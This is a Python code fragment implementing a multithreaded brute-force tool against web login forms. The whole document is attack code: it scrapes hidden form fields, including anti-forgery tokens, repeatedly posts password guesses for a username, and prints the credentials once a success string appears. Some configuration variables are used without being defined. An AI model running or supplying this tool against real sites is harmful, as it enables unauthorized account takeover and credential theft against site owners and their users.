class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print("Finished setting up for: {}".format(username))
 
    def run_bruteforce(self):
        for i in range(user_thread):
            t = Thread(target=self.web_bruter)
            t.start()
 
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get()
            response = requests.get(target_url)
            print("Trying: {}: {} ({} left)".format(self.username, brute, self.password_q.qsize()))
            jar = response.cookies
            soup = BeautifulSoup(response.text, 'lxml')
            tag_attrs = self.html_parser(soup)
            tag_attrs[username_field] = self.username
            tag_attrs[password_field] = brute
            login_data = requests.post(target_url, data=tag_attrs, cookies=jar)
            if success_check in login_data.text:
                self.found = True
                print("[*] Bruteforce successful")
                print("[*] Username: {}".format(username))
                print("[*] Password: {}".format(brute))
                print("[*] Waiting for other threads to exit ...")
 
 
    def html_parser(self, soup):
        tag_results = {}
        attrs = soup.find_all(type='hidden')
        for a in attrs:
            tag_name = None
            tag_value = None
            for name, value in a.attrs.items():
                if name == 'name':
                    tag_name = value
                if name == 'value':
                    tag_value = value
            tag_results[tag_name] = tag_value
        return tag_results